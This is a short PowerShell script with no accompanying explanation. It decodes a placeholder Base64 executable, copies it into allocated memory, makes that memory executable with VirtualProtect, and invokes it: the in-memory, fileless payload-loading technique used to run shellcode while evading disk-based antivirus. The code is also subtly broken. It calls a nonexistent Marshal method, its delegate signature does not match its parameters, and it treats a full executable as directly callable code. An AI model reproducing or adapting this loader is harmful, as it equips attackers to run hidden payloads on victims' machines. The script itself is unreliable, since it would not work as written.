# Base64-encoded executable or script (replace with your actual Base64 string)
$base64EncodedExecutable = "YOUR_BASE64_ENCODED_EXECUTABLE_HERE"

# Decode the Base64 string into a byte array
$executableBytes = [System.Convert]::FromBase64String($base64EncodedExecutable)

# Allocate memory and copy the executable into it
$memoryAddress = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($executableBytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($executableBytes, 0, $memoryAddress, $executableBytes.Length)

# Mark the memory as executable
$oldProtection = 0
$virtualProtectResult = [System.Runtime.InteropServices.Marshal]::DelegateToFunctionPointer(
    [Func[[IntPtr], [UIntPtr], [UInt32], [UInt32], [IntPtr], [bool]] {
        param($lpAddress, $dwSize, $flNewProtect, $lpflOldProtect)
        $kernel32 = Add-Type -MemberDefinition @"
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name "Kernel32" -Namespace "Win32" -PassThru
        return $kernel32::VirtualProtect($lpAddress, $dwSize, $flNewProtect, [ref]$lpflOldProtect)
    },
    [IntPtr]::Zero
).Invoke($memoryAddress, [UIntPtr]$executableBytes.Length, 0x40, [ref]$oldProtection)

if (-not $virtualProtectResult) {
    throw "Failed to mark memory as executable."
}

# Create a delegate to the memory address and invoke it
$delegateType = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memoryAddress, [Action])
$delegateType.Invoke()

# Free the allocated memory
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($memoryAddress)
